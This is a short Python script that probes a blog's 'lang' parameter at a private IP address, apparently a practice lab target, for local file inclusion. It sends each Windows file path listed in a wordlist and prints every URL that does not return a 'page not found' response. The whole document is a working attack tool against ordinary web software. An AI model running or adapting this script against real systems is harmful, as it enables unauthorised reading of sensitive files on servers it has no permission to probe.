#!/usr/bin/python
import requests

url = 'http://10.10.10.151/blog/?lang='

LFI = ''

with open('windows-lfi.txt', 'r') as f:
    pages = f.read().splitlines();

for p in pages:
    page = url + LFI + p
    check = requests.get(page)
    if "Sorry! Page not found" not in check.text:
        print(page)
